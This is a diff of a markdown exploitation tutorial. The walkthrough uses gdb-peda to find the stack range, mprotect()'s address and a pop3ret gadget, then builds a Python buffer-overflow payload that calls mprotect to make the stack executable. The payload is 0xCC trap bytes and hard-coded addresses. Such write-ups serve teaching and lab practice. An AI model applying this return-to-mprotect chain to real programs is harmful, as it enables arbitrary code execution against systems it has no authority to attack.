@@ -51,6 +51,7 @@ Our stack begin at ```0xfffdd000``` and have a size of ```0x21000```.
 
 ```
 gdb-peda$ vmmap
+
 Start      End        Perm  Name
 0xfffdd000 0xffffe000 rw-p  [stack]
 ```
@@ -60,7 +61,9 @@ Assuming that **ASLR** is disabled.
 The address of ```mprotect()``` is ```0xf7f2d2e0```
 
 ```
-gdb-peda$ p mprotect $1 = {<text variable, no debug info>} 0xf7f2d2e0 <mprotect>
+gdb-peda$ p mprotect
+
+$1 = {<text variable, no debug info>} 0xf7f2d2e0 <mprotect>
 ```
 
 The manual of ```mprotect()``` give us the signature of the function.
@@ -69,14 +72,17 @@ The manual of ```mprotect()``` give us the signature of the function.
 $ man mprotect
 
 NAME mprotect - set protection on a region of memory
+
 SYNOPSIS #include <sys/mman.h> int mprotect(void *addr, size_t len, int prot);
 ```
 
 Thus we know which argument to push.
+
 It should look like this : ```mprotect(0xfffdd000, 0x21000, 0x7);```
 
 ```
 gdb-peda$ searchmem CC 0xfffdd000 0xffffe000
+
 Searching for 'cc' in range: 0xfffdd000 - 0xffffe000
 0xffffd2c0 --> 0xcccccccc [stack] : 0xffffd2c1 --> 0xcccccccc [stack] :
 0xffffd2c2 --> 0xcccccccc [stack] : 0xffffd2c3 --> 0xcccccccc [stack] :
@@ -88,26 +94,29 @@ Gogo Gadget. :o)
 
 ```
 gdb-peda$ ropgadget
+
 pop3ret = 0x8048882
 ```
 
 Finally.
 
 ```
-python -c "
-    print'\xCC' * 524         # CC is the opcode for SIGTRAP
-    +'\xe0\xd2\xf2\xf7'       # address of mprotect()
-    +'\x82\x88\x04\x08'       # pop3ret cleaning the stack layout
-    +'\x00\xd0\xfd\xff'       # address of the stack
-    +'\x00\x10\x02\x00'       # size of the stack
-    +'\x07\x00\x00\x00'"      # flag read/write/execute
-    +'\xc0\xd2\xff\xff'       # payload on the stack ;)
+python -c "print
+    '\xCC' * 524            # CC is the opcode for SIGTRAP
+    +'\xe0\xd2\xf2\xf7'     # address of mprotect()
+    +'\x82\x88\x04\x08'     # pop3ret cleaning the stack layout
+    +'\x00\xd0\xfd\xff'     # address of the stack
+    +'\x00\x10\x02\x00'     # size of the stack
+    +'\x07\x00\x00\x00'     # flag read/write/execute
+    +'\xc0\xd2\xff\xff'     # payload on the stack ;)
+    "
 ```
 
-After calling mprotect you can notice the execution flag on the stack.
+Now, you can notice that the stack is executable.
 
 ```
 gdb-peda$ vmmap
+
 Start      End        Perm  Name
 0xfffdd000 0xffffe000 rwxp	[stack]
 ```
